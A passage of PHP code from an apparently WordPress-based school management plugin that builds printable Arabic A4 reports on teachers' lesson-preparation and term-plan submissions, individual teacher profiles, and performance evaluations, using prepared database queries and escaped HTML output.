                    $rows_html .= '</tr>';
                }

                $compliance_rate = $total_teachers > 0 ? round(($on_time_count / $total_teachers) * 100) : 0;
                ?>

                <div class="summary-grid">
                    <div class="summary-card">
                        <div style="font-size: 10px; color: #64748b; font-weight: 700;">إجمالي المعلمين</div>
                        <div style="font-size: 16px; font-weight: 900; color: #0f172a;"><?php echo $total_teachers; ?></div>
                    </div>
                    <div class="summary-card">
                        <div style="font-size: 10px; color: #166534; font-weight: 700;">في الموعد</div>
                        <div style="font-size: 16px; font-weight: 900; color: #15803d;"><?php echo $on_time_count; ?></div>
                    </div>
                    <div class="summary-card">
                        <div style="font-size: 10px; color: #b45309; font-weight: 700;">متأخر عن الموعد</div>
                        <div style="font-size: 16px; font-weight: 900; color: #d97706;"><?php echo $late_count; ?></div>
                    </div>
                    <div class="summary-card">
                        <div style="font-size: 10px; color: #991b1b; font-weight: 700;">لم يتم التسليم</div>
                        <div style="font-size: 16px; font-weight: 900; color: #dc2626;"><?php echo $missing_count; ?></div>
                    </div>
                    <div class="summary-card">
                        <div style="font-size: 10px; color: #0369a1; font-weight: 700;">نسبة الالتزام</div>
                        <div style="font-size: 16px; font-weight: 900; color: #0284c7;"><?php echo $compliance_rate; ?>%</div>
                    </div>
                </div>

                <table>
                    <thead>
                        <tr>
                            <th style="width: 30px; text-align:center;">#</th>
                            <th>اسم المعلم والرقم الوظيفي</th>
                            <th>المؤسسة / المدرسة</th>
                            <th>التخصص / المادة</th>
                            <th style="text-align:center;">حالة التسليم</th>
                            <th>تاريخ ووقت التسليم</th>
                            <th>مدة التأخير</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php echo $rows_html; ?>
                    </tbody>
                </table>
            </body>
            </html>
            <?php
            exit;
        } elseif ($print_type === 'school_lesson_prep_report' || $print_type === 'school_term_plans_report') {
            $user_roles = (array) wp_get_current_user()->roles;
            $is_privileged = in_array('administrator', $user_roles) || in_array('sm_system_admin', $user_roles) || in_array('sm_principal', $user_roles) || in_array('sm_supervisor', $user_roles) || in_array('sm_coordinator', $user_roles) || in_array('sm_hod', $user_roles) || in_array('sm_activities_supervisor', $user_roles);
            if (!$is_privileged) {
                wp_die('عفواً، لا تمتلك الصلاحية الكافية للوصول لتقرير المدرسة المحددة.');
            }

            $target_school_id = isset($_GET['school_id']) ? intval($_GET['school_id']) : 0;
            $target_school = 'المدرسة الرئيسية';
            if ($target_school_id > 0 && class_exists('EESS_Org_Helper')) {
                $sch_obj = EESS_Org_Helper::get_school_by_id($target_school_id);
                if ($sch_obj) $target_school = $sch_obj->name;
            } elseif (isset($_GET['school_name'])) {
                $target_school = sanitize_text_field($_GET['school_name']);
            }

            $term_num = isset($_GET['term_number']) ? intval($_GET['term_number']) : 1;
            if ($term_num < 1 || $term_num > 3) $term_num = 1;

            global $wpdb;
            $acad_struct = SM_Settings::get_academic_structure();
            $acad_year = $acad_struct['academic_year'] ?? '2027/2026';

            // Filter teachers strictly by target school ID or Name
            $all_teachers = get_users(array('role' => 'sm_teacher', 'orderby' => 'display_name', 'order' => 'ASC'));
            $school_teachers = array_filter($all_teachers, function($t) use ($target_school_id, $target_school) {
                if ($target_school_id > 0) {
                    $u_sch_id = get_user_meta($t->ID, 'eess_school_id', true);
                    if ($u_sch_id && intval($u_sch_id) === $target_school_id) return true;
                }
                $sch = get_user_meta($t->ID, 'eess_school_name', true) ?: 'المدرسة الرئيسية';
                return (trim($sch) === trim($target_school));
            });
            $teachers = array_values($school_teachers);

            $school_info = SM_Settings::get_school_info();
            $school_logo = !empty($school_info['logo_url']) ? $school_info['logo_url'] : '';

            $is_prep_report = ($print_type === 'school_lesson_prep_report');
            $arabic_weeks_map = array(
                1 => 'الأسبوع الأول', 2 => 'الأسبوع الثاني', 3 => 'الأسبوع الثالث', 4 => 'الأسبوع الرابع',
                5 => 'الأسبوع الخامس', 6 => 'الأسبوع السادس', 7 => 'الأسبوع السابع', 8 => 'الأسبوع الثامن',
                9 => 'الأسبوع التاسع', 10 => 'الأسبوع العاشر', 11 => 'الأسبوع الحادي عشر', 12 => 'الأسبوع الثاني عشر',
                13 => 'الأسبوع الثالث عشر', 14 => 'الأسبوع الرابع عشر', 15 => 'الأسبوع الخامس عشر', 16 => 'الأسبوع السادس عشر'
            );
            $week_title_suffix = ($filter_week_num > 0 && isset($arabic_weeks_map[$filter_week_num])) ? ' (' . $arabic_weeks_map[$filter_week_num] . ')' : '';
            $report_title = $is_prep_report ? 'التقرير الرسمي الموحد لمتابعة تحضير الدروس' . $week_title_suffix . ' — ' . $target_school : 'التقرير الرسمي الموحد لمتابعة الخطط الفصلية (الفصل ' . $term_num . ') — ' . $target_school;

            header('Content-Type: text/html; charset=utf-8');
            ?>
            <!DOCTYPE html>
            <html lang="ar" dir="rtl">
            <head>
                <meta charset="UTF-8">
                <title><?php echo esc_html($report_title); ?></title>
                <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&display=swap" rel="stylesheet">
                <style>
                    @page { size: A4 portrait; margin: 12mm 15mm; }
                    body { font-family: 'Cairo', sans-serif; background: #fff; color: #0f172a; margin: 0; padding: 15px; direction: rtl; font-size: 11px; }
                    .report-header { display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #0f172a; padding-bottom: 12px; margin-bottom: 15px; }
                    .brand-box { display: flex; align-items: center; gap: 12px; }
                    .brand-logo { width: 52px; height: 52px; object-fit: contain; }
                    .report-title { font-size: 15px; font-weight: 900; color: #881337; margin: 0 0 3px 0; }
                    .report-subtitle { font-size: 11px; color: #475569; font-weight: 700; margin: 0; }
                    table { width: 100%; border-collapse: collapse; margin-top: 10px; font-size: 11px; }
                    th { background: #0f172a; color: #fff; padding: 7px 10px; font-weight: 800; text-align: right; border: 1px solid #0f172a; }
                    td { padding: 6px 10px; border: 1px solid #cbd5e1; text-align: right; vertical-align: middle; }
                    tr:nth-child(even) { background: #f8fafc; }
                    .status-pill { display: inline-block; padding: 2px 8px; border-radius: 9999px; font-weight: 800; font-size: 10px; text-align: center; }
                    .pill-success { background: #dcfce7; color: #15803d; border: 1px solid #bbf7d0; }
                    .pill-warning { background: #fef3c7; color: #b45309; border: 1px solid #fde68a; }
                    .pill-danger { background: #fee2e2; color: #991b1b; border: 1px solid #fecdd3; }
                    .summary-grid { display: grid; grid-template-columns: repeat(6, 1fr); gap: 10px; margin-bottom: 15px; }
                    .summary-card { background: #f8fafc; border: 1px solid #cbd5e1; padding: 8px 10px; border-radius: 8px; text-align: center; }
                    @media print { body { padding: 0; } .no-print { display: none; } }
                </style>
            </head>
            <body>
                <div class="no-print" style="margin-bottom: 15px; text-align: left;">
                    <button onclick="window.print()" style="background: #0284c7; color: #fff; border: none; padding: 8px 20px; font-family: 'Cairo'; font-weight: 800; border-radius: 9999px; cursor: pointer; font-size: 12px;">🖨️ طباعة التقرير الرسمي للمدرسة A4</button>
                </div>

                <!-- Official Dual Header -->
                <div class="report-header">
                    <div class="brand-box">
                        <?php if ($school_logo): ?>
                            <img src="<?php echo esc_url($school_logo); ?>" class="brand-logo" alt="Logo">
                        <?php endif; ?>
                        <div>
                            <div style="font-size: 15px; font-weight: 900; color: #0f172a;">مؤسسة الشعلة للتعليم والتطوير</div>
                            <div style="font-size: 12px; color: #0284c7; font-weight: 800; margin-top: 2px;"><?php echo esc_html($target_school); ?></div>
                        </div>
                    </div>
                    <div style="text-align: left;">
                        <h1 class="report-title"><?php echo esc_html($report_title); ?></h1>
                        <p class="report-subtitle">العام الأكاديمي: <?php echo esc_html($acad_year); ?> | تاريخ التصدير: <?php echo date_i18n('Y-m-d H:i'); ?></p>
                    </div>
                </div>

                <?php
                $total_teachers = count($teachers);
                $submitted_count = 0;
                $approved_count = 0;
                $returned_count = 0;
                $rejected_count = 0;
                $missing_count = 0;
                $rows_html = '';

                foreach ($teachers as $idx => $t) {
                    $emp_id = get_user_meta($t->ID, 'eess_employee_number', true) ?: ('EMP-' . $t->ID);
                    $t_subj = get_user_meta($t->ID, 'sm_specialization', true) ?: (get_user_meta($t->ID, 'specialization', true) ?: (get_user_meta($t->ID, 'subject', true) ?: 'عام'));

                    if ($is_prep_report) {
                        if ($filter_week_num > 0) {
                            $all_preps = $wpdb->get_results($wpdb->prepare("SELECT * FROM {$wpdb->prefix}sm_lesson_preps WHERE teacher_id = %d ORDER BY created_at DESC", $t->ID));
                            $rec = null;
                            $acad_anchor_ts = strtotime('2026-08-28 00:00:00');
                            foreach ($all_preps as $p) {
                                $p_ts = strtotime($p->updated_at ?: $p->created_at);
                                $cw = ($p_ts >= $acad_anchor_ts) ? (intval(floor(($p_ts - $acad_anchor_ts) / (7 * 86400))) + 1) : 1;
                                if ($cw === $filter_week_num) {
                                    $rec = $p;
                                    break;
                                }
                            }
                        } else {
                            $rec = $wpdb->get_row($wpdb->prepare("SELECT * FROM {$wpdb->prefix}sm_lesson_preps WHERE teacher_id = %d ORDER BY created_at DESC LIMIT 1", $t->ID));
                        }
                    } else {
                        $rec = $wpdb->get_row($wpdb->prepare("SELECT * FROM {$wpdb->prefix}sm_term_plans WHERE teacher_id = %d AND term_number = %d ORDER BY created_at DESC LIMIT 1", $t->ID, $term_num));
                    }

                    $st_text = '⚠️ لم يتم التسليم';
                    $st_class = 'pill-danger';
                    $sub_time = '---';
                    $delay_txt = '---';
                    $app_status = '---';
                    $notes = '---';

                    if ($rec) {
                        $submitted_count++;
                        $sub_created = $rec->updated_at ?: $rec->created_at;
                        $sub_time = date_i18n('Y-m-d H:i', strtotime($sub_created));
                        $notes = esc_html($rec->review_notes ?: 'لا توجد ملاحظات');

                        if ($rec->status === 'approved') {
                            $approved_count++;
                            $st_class = 'pill-success';
                            $st_text = '✓ تم التسليم والمعاينة';
                            $app_status = 'معتمد رسمياً';
                        } elseif ($rec->status === 'returned' || $rec->status === 'revision_required') {
                            $returned_count++;
                            $st_class = 'pill-warning';
                            $st_text = '⏱️ طلب تعديل';
                            $app_status = 'تحت التعديل';
                        } elseif ($rec->status === 'rejected') {
                            $rejected_count++;
                            $st_class = 'pill-danger';
                            $st_text = '✕ مرفوض';
                            $app_status = 'مرفوض';
                        } else {
                            $st_class = 'pill-success';
                            $st_text = '✓ تم التسليم';
                            $app_status = 'بانتظار المراجعة';
                        }

                        if (!empty($rec->delay_seconds) && $rec->delay_seconds > 0) {
                            $delay_txt = 'تأخير ' . round($rec->delay_seconds / 3600, 1) . ' ساعة';
                        } else {
                            $delay_txt = 'في الموعد';
                        }
                    } else {
                        $missing_count++;
                    }

                    $rows_html .= '<tr>';
                    $rows_html .= '<td style="text-align:center;">' . ($idx + 1) . '</td>';
                    $rows_html .= '<td><strong>' . esc_html($t->display_name) . '</strong></td>';
                    $rows_html .= '<td><span style="font-family:monospace; font-weight:bold;">' . esc_html($emp_id) . '</span></td>';
                    $rows_html .= '<td>' . esc_html($t_subj) . '</td>';
                    $rows_html .= '<td style="text-align:center;"><span class="status-pill ' . $st_class . '">' . $st_text . '</span></td>';
                    $rows_html .= '<td>' . $sub_time . '</td>';
                    $rows_html .= '<td>' . $delay_txt . '</td>';
                    $rows_html .= '<td>' . $app_status . '</td>';
                    $rows_html .= '<td style="font-size:10px;">' . $notes . '</td>';
                    $rows_html .= '</tr>';
                }

                $comp_rate = $total_teachers > 0 ? round(($submitted_count / $total_teachers) * 100) : 0;
                ?>

                <!-- School Executive Summary Grid -->
                <div class="summary-grid">
                    <div class="summary-card">
                        <div style="font-size: 10px; color: #64748b; font-weight: 700;">إجمالي معلمي المدرسة</div>
                        <div style="font-size: 16px; font-weight: 900; color: #0f172a;"><?php echo $total_teachers; ?></div>
                    </div>
                    <div class="summary-card">
                        <div style="font-size: 10px; color: #0369a1; font-weight: 700;">المستلم / المرفوع</div>
                        <div style="font-size: 16px; font-weight: 900; color: #0284c7;"><?php echo $submitted_count; ?></div>
                    </div>
                    <div class="summary-card">
                        <div style="font-size: 10px; color: #166534; font-weight: 700;">المعتمد رسمياً</div>
                        <div style="font-size: 16px; font-weight: 900; color: #16a34a;"><?php echo $approved_count; ?></div>
                    </div>
                    <div class="summary-card">
                        <div style="font-size: 10px; color: #b45309; font-weight: 700;">طلبات التعديل</div>
                        <div style="font-size: 16px; font-weight: 900; color: #d97706;"><?php echo $returned_count; ?></div>
                    </div>
                    <div class="summary-card">
                        <div style="font-size: 10px; color: #991b1b; font-weight: 700;">غير التسليم / المفقود</div>
                        <div style="font-size: 16px; font-weight: 900; color: #dc2626;"><?php echo $missing_count; ?></div>
                    </div>
                    <div class="summary-card">
                        <div style="font-size: 10px; color: #0284c7; font-weight: 700;">نسبة الامتثال للمدرسة</div>
                        <div style="font-size: 16px; font-weight: 900; color: #0284c7;"><?php echo $comp_rate; ?>%</div>
                    </div>
                </div>

                <!-- Detailed Teachers Table -->
                <table>
                    <thead>
                        <tr>
                            <th style="width: 30px; text-align:center;">#</th>
                            <th>اسم المعلم</th>
                            <th>الرقم الوظيفي</th>
                            <th>التخصص والمادة</th>
                            <th style="text-align:center;">حالة التسليم</th>
                            <th>تاريخ ووقت التسليم</th>
                            <th>مؤشر التأخير</th>
                            <th>حالة الاعتماد</th>
                            <th>ملاحظات المتابعة والاعتماد</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php echo $rows_html; ?>
                    </tbody>
                </table>
            </body>
            </html>
            <?php
            exit;
        } elseif ($print_type === 'teacher_profile_report') {
            $t_id = intval($_GET['teacher_id'] ?? 0);
            $user = get_userdata($t_id);
            if (!$user) wp_die('الموظف غير موجود بالنظام.');

            global $wpdb;
            $roles = (array) $user->roles;
            $primary_role = !empty($roles) ? reset($roles) : 'sm_teacher';
            $role_labels = array(
                'administrator' => 'مدير النظام المطور',
                'sm_system_admin' => 'مدير النظام المطور',
                'sm_principal' => 'مدير المدرسة',
                'sm_supervisor' => 'مشرف تربوي',
                'sm_coordinator' => 'منسق مادة',
                'sm_teacher' => 'معلم',
                'sm_student' => 'طالب',
                'sm_parent' => 'ولي أمر',
                'sm_discipline_supervisor' => 'مشرف سلوك / انضباط',
                'sm_activities_supervisor' => 'مشرف أنشطة',
                'sm_transportation_supervisor' => 'مشرف نقل ومواصلات',
                'sm_bus_supervisor' => 'مشرف حافلة',
                'sm_clinic' => 'العيادة المدرسية',
                'sm_hr' => 'الموارد البشرية (HR)'
            );

            $emp_number = get_user_meta($t_id, 'eess_employee_number', true) ?: (get_user_meta($t_id, 'sm_employee_id', true) ?: $user->user_login);
            $school_name = get_user_meta($t_id, 'eess_school_name', true) ?: 'المدرسة الرئيسية';
            $department = get_user_meta($t_id, 'eess_department', true) ?: (get_user_meta($t_id, 'department', true) ?: get_user_meta($t_id, 'sm_department', true) ?: 'قسم التربية البدنية والصحية');
            $subject = get_user_meta($t_id, 'sm_specialization', true) ?: (get_user_meta($t_id, 'specialization', true) ?: 'التربية البدنية والصحية');

            $assigned_grades_raw = get_user_meta($t_id, 'sm_assigned_grades', true) ?: (get_user_meta($t_id, 'eess_assigned_grades', true) ?: (get_user_meta($t_id, 'sm_grade_level', true) ?: 'الصف العاشر'));
            if (is_array($assigned_grades_raw)) $assigned_grades_raw = implode(', ', $assigned_grades_raw);
            $assigned_grades_clean = str_replace(array('[', ']', '"', "'", '\\'), '', (string)$assigned_grades_raw);

            $assigned_sections_raw = get_user_meta($t_id, 'sm_assigned_sections', true) ?: (get_user_meta($t_id, 'eess_assigned_sections', true) ?: 'شعبة 1، شعبة 2');
            if (is_array($assigned_sections_raw)) $assigned_sections_raw = implode(', ', $assigned_sections_raw);

            $phone = get_user_meta($t_id, 'phone_number', true) ?: (get_user_meta($t_id, 'sm_phone', true) ?: '---');
            $civil_id = get_user_meta($t_id, 'eess_civil_id', true) ?: (get_user_meta($t_id, 'civil_id', true) ?: '---');
            $nationality = get_user_meta($t_id, 'nationality', true) ?: (get_user_meta($t_id, 'sm_nationality', true) ?: 'الإمارات العربية المتحدة');
            $gender = get_user_meta($t_id, 'gender', true) ?: (get_user_meta($t_id, 'eess_gender', true) ?: 'ذكر');
            $dob = get_user_meta($t_id, 'dob', true) ?: (get_user_meta($t_id, 'sm_dob', true) ?: '---');
            $emirate = get_user_meta($t_id, 'eess_emirate', true) ?: 'دبي';
            $appoint_year = get_user_meta($t_id, 'eess_appointment_year', true) ?: (get_user_meta($t_id, 'appointment_year', true) ?: '2022');
            $photo_url = get_avatar_url($t_id, array('size' => 120));

            $school_info = SM_Settings::get_school_info();
            $school_logo = !empty($school_info['logo_url']) ? $school_info['logo_url'] : '';

            // Activity Queries
            $term_plans = $wpdb->get_results($wpdb->prepare("SELECT * FROM {$wpdb->prefix}sm_term_plans WHERE teacher_id = %d ORDER BY term_number ASC", $t_id));
            $lesson_preps = $wpdb->get_results($wpdb->prepare("SELECT * FROM {$wpdb->prefix}sm_lesson_preps WHERE teacher_id = %d ORDER BY created_at DESC LIMIT 15", $t_id));

            header('Content-Type: text/html; charset=utf-8');
            ?>
            <!DOCTYPE html>
            <html lang="ar" dir="rtl">
            <head>
                <meta charset="UTF-8">
                <title>الملف الوظيفي والأكاديمي — <?php echo esc_html($user->display_name); ?></title>
                <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&display=swap" rel="stylesheet">
                <style>
                    @page { size: A4 portrait; margin: 12mm 15mm; }
                    body { font-family: 'Cairo', sans-serif; background: #fff; color: #0f172a; margin: 0; padding: 15px; direction: rtl; font-size: 11px; }
                    .report-header { display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #0f172a; padding-bottom: 12px; margin-bottom: 15px; }
                    .brand-box { display: flex; align-items: center; gap: 12px; }
                    .brand-logo { width: 52px; height: 52px; object-fit: contain; }
                    .report-title { font-size: 15px; font-weight: 900; color: #881337; margin: 0 0 3px 0; }
                    .report-subtitle { font-size: 11px; color: #475569; font-weight: 700; margin: 0; }
                    .card { background: #f8fafc; border: 1px solid #cbd5e1; border-radius: 10px; padding: 12px 15px; margin-bottom: 14px; }
                    .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
                    table { width: 100%; border-collapse: collapse; margin-top: 8px; font-size: 11px; }
                    th { background: #0f172a; color: #fff; padding: 6px 10px; font-weight: 800; text-align: right; border: 1px solid #0f172a; }
                    td { padding: 6px 10px; border: 1px solid #cbd5e1; text-align: right; vertical-align: middle; }
                    @media print { body { padding: 0; } .no-print { display: none; } }
                </style>
            </head>
            <body>
                <div class="no-print" style="margin-bottom: 15px; text-align: left;">
                    <button onclick="window.print()" style="background: #0284c7; color: #fff; border: none; padding: 8px 20px; font-family: 'Cairo'; font-weight: 800; border-radius: 9999px; cursor: pointer; font-size: 12px;">🖨️ طباعة التقرير PDF</button>
                </div>

                <div class="report-header">
                    <div class="brand-box">
                        <?php if ($school_logo): ?>
                            <img src="<?php echo esc_url($school_logo); ?>" class="brand-logo" alt="Logo">
                        <?php endif; ?>
                        <div>
                            <div style="font-size: 15px; font-weight: 900; color: #0f172a;">مؤسسة الشعلة للتعليم والتطوير</div>
                            <div style="font-size: 12px; color: #0284c7; font-weight: 800; margin-top: 2px;"><?php echo esc_html($school_name); ?></div>
                        </div>
                    </div>
                    <div style="text-align: left;">
                        <h1 class="report-title">الملف الوظيفي والأكاديمي الشامل</h1>
                        <p class="report-subtitle">تاريخ التقرير: <?php echo current_time('Y-m-d H:i'); ?></p>
                    </div>
                </div>

                <!-- Teacher Header Identity -->
                <div class="card" style="display: flex; align-items: center; justify-content: space-between;">
                    <div style="display: flex; align-items: center; gap: 14px;">
                        <img src="<?php echo esc_url($photo_url); ?>" style="width: 60px; height: 60px; border-radius: 50%; object-fit: cover; border: 2px solid #0284c7;">
                        <div>
                            <h2 style="margin:0 0 4px 0; font-size: 16px; font-weight: 900; color: #0f172a;"><?php echo esc_html($user->display_name); ?></h2>
                            <div style="font-size: 11px; color: #475569; font-weight: 700;">
                                <strong>الرتبة:</strong> <?php echo esc_html($role_labels[$primary_role] ?? 'معلم'); ?> |
                                <strong>الكود:</strong> <?php echo esc_html($emp_number); ?> |
                                <strong>المدرسة:</strong> <?php echo esc_html($school_name); ?>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Personal & Academic Assignment Card -->
                <div class="card">
                    <h4 style="margin:0 0 8px 0; font-size: 12.5px; font-weight: 800; color: #881337; border-bottom: 1px solid #e2e8f0; padding-bottom: 4px;">البيانات الشخصية والمهنية والتكليفات التعليمية</h4>
                    <div class="grid-2">
                        <div><strong>القسم / المادة:</strong> <?php echo esc_html($department . ' | ' . $subject); ?></div>
                        <div><strong>الصفوف المسندة:</strong> <?php echo esc_html($assigned_grades_clean ?: 'الكل'); ?></div>
                        <div><strong>الشعب الدراسية:</strong> <?php echo esc_html($assigned_sections_raw ?: 'الكل'); ?></div>
                        <div><strong>الهاتف والبريد:</strong> <?php echo esc_html($phone . ' | ' . $user->user_email); ?></div>
                        <div><strong>سنة التعيين والإمارة:</strong> <?php echo esc_html($appoint_year . ' — ' . $emirate); ?></div>
                        <div><strong>الجنسية والجنس:</strong> <?php echo esc_html($nationality . ' — ' . $gender); ?></div>
                        <div><strong>تاريخ الميلاد:</strong> <?php echo esc_html($dob); ?></div>
                        <div><strong>الهوية الوطنية:</strong> <?php echo esc_html($civil_id); ?></div>
                    </div>
                </div>

                <!-- Term Plans Summary Card -->
                <div class="card">
                    <h4 style="margin:0 0 8px 0; font-size: 12.5px; font-weight: 800; color: #0284c7; border-bottom: 1px solid #e2e8f0; padding-bottom: 4px;">نشاط وإنجاز الخطط الفصلية والسنوية (<?php echo count($term_plans); ?> خطط)</h4>
                    <?php if (empty($term_plans)): ?>
                        <div style="color: #64748b;">لا توجد خطط فصلية مرفوعة حالياً.</div>
                    <?php else: ?>
                        <table>
                            <thead>
                                <tr>
                                    <th>الفصل الدراسي</th>
                                    <th>المادة والصف</th>
                                    <th>تاريخ التسليم</th>
                                    <th>الحالة الرسمية</th>
                                </tr>
                            </thead>
                            <tbody>
                                <?php foreach ($term_plans as $tp):
                                    $st = 'مسودة';
                                    if ($tp->status === 'submitted') $st = 'مرفوعة للمراجعة';
                                    elseif ($tp->status === 'approved') $st = 'معتمدة رسمياً';
                                    elseif ($tp->status === 'returned') $st = 'طلب تعديل';
                                ?>
                                    <tr>
                                        <td>الفصل الدراسي <?php echo intval($tp->term_number); ?></td>
                                        <td><?php echo esc_html($tp->subject . ' (' . $tp->grade . ')'); ?></td>
                                        <td><?php echo esc_html(date_i18n('Y-m-d H:i', strtotime($tp->updated_at ?: $tp->created_at))); ?></td>
                                        <td><strong><?php echo $st; ?></strong></td>
                                    </tr>
                                <?php endforeach; ?>
                            </tbody>
                        </table>
                    <?php endif; ?>
                </div>

                <!-- Lesson Prep Summary Card -->
                <div class="card">
                    <h4 style="margin:0 0 8px 0; font-size: 12.5px; font-weight: 800; color: #16a34a; border-bottom: 1px solid #e2e8f0; padding-bottom: 4px;">نشاط تحضير الدروس الأخيرة (أحدث <?php echo count($lesson_preps); ?> تحضيرات)</h4>
                    <?php if (empty($lesson_preps)): ?>
                        <div style="color: #64748b;">لا توجد تحضيرات دروس مسجلة حالياً.</div>
                    <?php else: ?>
                        <table>
                            <thead>
                                <tr>
                                    <th>عنوان الدرس</th>
                                    <th>المادة والصف</th>
                                    <th>تاريخ ووقت التسليم</th>
                                    <th>الحالة الرسمية</th>
                                </tr>
                            </thead>
                            <tbody>
                                <?php
                                $acad_anchor_ts = strtotime('2026-08-28 00:00:00');
                                foreach ($lesson_preps as $lp):
                                    $dt = $lp->updated_at ?: $lp->created_at;
                                    $p_ts = strtotime($dt);
                                    $cw = ($p_ts >= $acad_anchor_ts) ? (intval(floor(($p_ts - $acad_anchor_ts) / (7 * 86400))) + 1) : 1;
                                    $st = 'مسودة';
                                    if ($lp->status === 'submitted') $st = 'مرفوع للمراجعة';
                                    elseif ($lp->status === 'approved') $st = 'معتمد رسمياً';
                                    elseif ($lp->status === 'revision_required' || $lp->status === 'returned') $st = 'طلب تعديل';
                                ?>
                                    <tr>
                                        <td>الأسبوع <?php echo $cw; ?>: <?php echo esc_html($lp->title ?: 'تحضير درس'); ?></td>
                                        <td><?php echo esc_html($lp->subject . ' (' . $lp->grade_level . ')'); ?></td>
                                        <td><?php echo esc_html(date_i18n('Y-m-d H:i', strtotime($dt))); ?></td>
                                        <td><strong><?php echo $st; ?></strong></td>
                                    </tr>
                                <?php endforeach; ?>
                            </tbody>
                        </table>
                    <?php endif; ?>
                </div>
            </body>
            </html>
            <?php
            exit;
        } elseif ($print_type === 'eval_report') {
            $eval_id = intval($_GET['eval_id'] ?? 0);
            global $wpdb;

            $eval = $wpdb->get_row($wpdb->prepare("
                SELECT e.*, u_emp.display_name as emp_name, u_eval.display_name as evaluator_name
                FROM {$wpdb->prefix}sm_evaluations e
                JOIN {$wpdb->prefix}users u_emp ON e.employee_id = u_emp.ID
                JOIN {$wpdb->prefix}users u_eval ON e.evaluator_id = u_eval.ID
                WHERE e.id = %d
            ", $eval_id));

            if (!$eval) wp_die('وثيقة التقييم غير موجودة بالنظام.');

            $emp_num = get_user_meta($eval->employee_id, 'eess_employee_number', true) ?: $eval->employee_id;
            $school_name = get_user_meta($eval->employee_id, 'eess_school_name', true) ?: 'المدرسة الرئيسية';
            $department = get_user_meta($eval->employee_id, 'eess_department', true) ?: (get_user_meta($eval->employee_id, 'department', true) ?: 'قسم التربية البدنية والصحية');
            $subject = get_user_meta($eval->employee_id, 'sm_specialization', true) ?: 'عام';
            $photo_url = get_avatar_url($eval->employee_id, array('size' => 100));

            $school_info = SM_Settings::get_school_info();
            $school_logo = !empty($school_info['logo_url']) ? $school_info['logo_url'] : '';

            $answers = json_decode($eval->answers_json ?? '[]', true);

            header('Content-Type: text/html; charset=utf-8');
            ?>
            <!DOCTYPE html>
            <html lang="ar" dir="rtl">
            <head>
                <meta charset="UTF-8">
                <title>تقرير تقييم الأداء الوظيفي — <?php echo esc_html($eval->emp_name); ?></title>
                <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&display=swap" rel="stylesheet">
                <style>
                    @page { size: A4 portrait; margin: 12mm 15mm; }
                    body { font-family: 'Cairo', sans-serif; background: #fff; color: #0f172a; margin: 0; padding: 15px; direction: rtl; font-size: 11px; }
                    .report-header { display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #0f172a; padding-bottom: 12px; margin-bottom: 15px; }
                    .brand-box { display: flex; align-items: center; gap: 12px; }
                    .brand-logo { width: 52px; height: 52px; object-fit: contain; }
                    .report-title { font-size: 15px; font-weight: 900; color: #881337; margin: 0 0 3px 0; }
                    .card { background: #f8fafc; border: 1px solid #cbd5e1; border-radius: 10px; padding: 12px 15px; margin-bottom: 14px; }
                    table { width: 100%; border-collapse: collapse; margin-top: 8px; font-size: 11px; }
                    th { background: #0f172a; color: #fff; padding: 6px 10px; font-weight: 800; text-align: right; border: 1px solid #0f172a; }
                    td { padding: 6px 10px; border: 1px solid #cbd5e1; text-align: right; vertical-align: middle; }
                    @media print { body { padding: 0; } .no-print { display: none; } }
                </style>
            </head>
            <body>
                <div class="no-print" style="margin-bottom: 15px; text-align: left;">
                    <button onclick="window.print()" style="background: #0284c7; color: #fff; border: none; padding: 8px 20px; font-family: 'Cairo'; font-weight: 800; border-radius: 9999px; cursor: pointer; font-size: 12px;">🖨️ طباعة التقرير PDF</button>
                </div>

                <div class="report-header">
                    <div class="brand-box">
                        <?php if ($school_logo): ?>
                            <img src="<?php echo esc_url($school_logo); ?>" class="brand-logo" alt="Logo">
                        <?php endif; ?>
                        <div>
                            <div style="font-size: 14px; font-weight: 900; color: #0f172a;">مؤسسة الشعلة للتعليم والتطوير</div>
                            <div style="font-size: 11.5px; color: #0284c7; font-weight: 800;"><?php echo esc_html($school_name); ?></div>
                        </div>
                    </div>
                    <div style="text-align: left;">
                        <h1 class="report-title">تقرير تقييم الأداء السنوي المعتمد</h1>
                        <p style="margin:0; font-size:11px; color:#64748b;">العام الدراسي: <?php echo esc_html($eval->academic_year); ?></p>
                    </div>
                </div>

                <div class="card" style="display: flex; align-items: center; justify-content: space-between;">
                    <div style="display: flex; align-items: center; gap: 14px;">
                        <img src="<?php echo esc_url($photo_url); ?>" style="width: 54px; height: 54px; border-radius: 50%; object-fit: cover; border: 2px solid #881337;">
                        <div>
                            <h2 style="margin: 0 0 4px 0; font-size: 15px; font-weight: 900; color: #0f172a;"><?php echo esc_html($eval->emp_name); ?></h2>
                            <div style="font-size: 11px; color: #475569;">الكود الوظيفي: <strong><?php echo esc_html($emp_num); ?></strong> | القسم: <strong><?php echo esc_html($department); ?></strong></div>
                        </div>
                    </div>
                    <div style="text-align: center; background: #ffffff; padding: 10px 18px; border-radius: 10px; border: 1px solid #cbd5e1;">
                        <div style="font-size: 10px; color: #64748b; font-weight: bold;">النتيجة النهائية</div>
                        <div style="font-size: 20px; font-weight: 900; color: #16a34a;"><?php echo intval($eval->average_pct); ?>%</div>
                    </div>
                </div>

                <div class="card">
                    <h4 style="margin:0 0 8px 0; font-size: 12.5px; font-weight: 800; color: #881337; border-bottom: 1px solid #e2e8f0; padding-bottom: 4px;">تفاصيل تقييم المعايير المعتمدة (0–10)</h4>
                    <table>
                        <thead>
                            <tr>
                                <th style="width: 30px; text-align:center;">#</th>
                                <th>المعيار / سؤال التقييم</th>
                                <th style="width: 100px; text-align:center;">الدرجة الممنوحة</th>
                            </tr>
                        </thead>
                        <tbody>
                            <?php if (!empty($answers)): foreach ($answers as $i => $ans): ?>
                                <tr>
                                    <td style="text-align:center; font-weight:bold;"><?php echo ($i + 1); ?></td>
                                    <td><?php echo esc_html($ans['question_text'] ?? '-'); ?></td>
                                    <td style="text-align:center; font-weight:bold; color:#881337;"><?php echo floatval($ans['score'] ?? 0); ?> / 10</td>
                                </tr>
